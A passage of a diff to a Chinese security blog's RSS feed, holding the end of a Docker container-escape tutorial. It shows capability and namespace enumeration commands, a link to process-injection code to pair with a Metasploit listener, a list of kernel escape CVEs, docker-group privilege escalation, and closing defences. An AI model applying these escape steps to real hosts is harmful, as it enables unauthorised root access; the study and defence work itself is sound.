+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;capsh --print &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep cap_sys_ptrace &lt;span class=&#34;c1&#34;&gt;# 我这里没有这个命令，换了一个，但是正常还是用这个&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /proc/self/status &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep -E &lt;span class=&#34;s1&#34;&gt;&amp;#39;CapPrm|CapEff&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ps aux &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep dockerd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;如果输出中包含 &lt;code&gt;cap_sys_ptrace&lt;/code&gt; 字段，说明容器具有该权限。&lt;/li&gt;
+&lt;li&gt;如果没有 &lt;code&gt;cap_sys_ptrace&lt;/code&gt;，说明容器缺少此能力。
+判断是否与宿主机共享进程命名空间&lt;br&gt;
+如果能看到宿主机的进程（如 Docker 守护进程 &lt;code&gt;dockerd&lt;/code&gt;），说明共享了宿主机的进程命名空间&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://xxxxctfer.github.io/images/docker/docker30.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;示例&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;很明显可以看到都符合了，我们就可以打进程注入了，这个不用手搓，用网上的东西。
+&lt;a class=&#34;link&#34; href=&#34;https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c&lt;/a&gt;
+稍微修改一下，就可以MSF直接监听进程了，还是简单的，我后面就不打了，懒惰这一块。&lt;/p&gt;
+&lt;h2 id=&#34;内核漏洞逃逸&#34;&gt;内核漏洞逃逸
+&lt;/h2&gt;&lt;p&gt;docker逃逸怎么能少了一些内核漏洞的逃逸呢，这里简单举例一些吧。
+和权限提升时的dirty利用方法差不太多，之所以能实现逃逸，是因为docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机，有时间在Linux内核提权的时候一起实践。
+除了脏牛，还有很多内核漏洞导致的逃逸，这里列举一些就不细讲了：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2019-16884&lt;/li&gt;
+&lt;li&gt;CVE-2021-3493&lt;/li&gt;
+&lt;li&gt;CVE-2021-22555&lt;/li&gt;
+&lt;li&gt;CVE-2022-0492&lt;/li&gt;
+&lt;li&gt;CVE-2022-0847&lt;/li&gt;
+&lt;li&gt;CVE-2022-23222&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;docker用户组提权&#34;&gt;docker用户组提权
+&lt;/h2&gt;&lt;p&gt;这个跟内核提权也很像，也是提权类似的操作。
+基础知识：
+Docker 运行的所有命令都是需要 sudo 来运行，那是因为 docker 需要 root 权限才能运行
+Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，就相当于拥有了root 的访问权限&lt;/p&gt;
+&lt;p&gt;用法还是挺简单的，运行docker命令的时候整一个特权容器，或者特殊挂载什么的，就变成root逃逸出来，变成root权限了。&lt;/p&gt;
+&lt;h2 id=&#34;cdk&#34;&gt;CDK
+&lt;/h2&gt;&lt;p&gt;这里介绍一个工具，跟前面的那个检测有点类似，但是这个功能更多一些。
+&lt;a class=&#34;link&#34; href=&#34;https://github.com/cdk-team/CDK/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/cdk-team/CDK/&lt;/a&gt;
+这里就不演示了，具体的可以看这位师傅的文章：https://xz.aliyun.com/news/17111&lt;/p&gt;
+&lt;h1 id=&#34;针对docker逃逸的防御措施&#34;&gt;针对docker逃逸的防御措施
+&lt;/h1&gt;&lt;p&gt;针对上面提到的手段，可以有如下防御措施：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;即时更新docker&lt;/li&gt;
+&lt;li&gt;docker使用capabilities时需要遵循最小特权原则&lt;/li&gt;
+&lt;li&gt;尽量在启动容器时使用&amp;ndash;user选项指定容器以非特权用户身份运行&lt;/li&gt;
+&lt;li&gt;不要直接挂载主机文件，尽量使用数据卷或共享文件系统&lt;/li&gt;
+&lt;li&gt;将容器中的root用户映射为宿主机中的普通用户&lt;/li&gt;
+&lt;li&gt;不要在容器中挂载docker socket，也不要将docker api配置到公网&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;参考链接：
+&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/news/17111&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://xz.aliyun.com/news/17111&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/yuy0ung/articles/18819294&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://www.cnblogs.com/yuy0ung/articles/18819294&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>内网通信隧道学习</title>
         <link>https://xxxxctfer.github.io/p/%E5%86%85%E7%BD%91%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E5%AD%A6%E4%B9%A0/</link>
         <pubDate>Tue, 31 Mar 2026 00:00:00 +0000</pubDate>
